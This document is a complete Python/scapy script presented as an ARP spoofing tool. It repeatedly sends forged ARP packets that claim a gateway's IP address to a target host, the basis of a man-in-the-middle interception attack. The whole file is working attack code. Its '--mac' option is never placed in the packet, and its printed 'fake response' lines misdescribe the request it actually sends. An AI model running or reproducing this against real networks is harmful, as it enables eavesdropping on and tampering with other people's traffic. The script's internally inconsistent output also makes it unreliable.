#!/usr/bin/env python3
import sys
import time
from scapy.all import Ether, ARP, srp, send
import argparse

def get_interface():
    """Return the first available interface name."""
    from scapy.arch import get_if_list
    ifaces = get_if_list()
    if not ifaces:
        print("No network interfaces found")
        sys.exit(1)
    return ifaces[0]

def main():
    parser = argparse.ArgumentParser(description='ARP spoofing tool')
    parser.add_argument('-i', '--interface', default=None, help='Network interface to use')
    parser.add_argument('-t', '--target', default='192.168.53.99', help='Target IP address')
    parser.add_argument('-g', '--gateway', default='192.168.53.33', help='Gateway IP address')
    parser.add_argument('-m', '--mac', default='aa:bb:cc:dd:ee:ff', help='Fake MAC address to use')
    args = parser.parse_args()
    
    # Use specified interface or find one
    interface = args.interface or get_interface()
    print(f"Interface Name: {interface}")
    print("-" * 35)
    
    # Create ARP packet
    arp = ARP(pdst=args.target, psrc=args.gateway)
    
    while True:
        # Send the packet
        send(arp, verbose=0)
        print(f"Ether / ARP who has {args.gateway} says {args.target} / Padding")
        print(f"*****Fake response: Ether / ARP is at {args.mac} says {args.gateway}")
        print("-" * 35)
        
        # Sleep for a bit before sending again
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting ARP spoofer.")
        sys.exit(0)
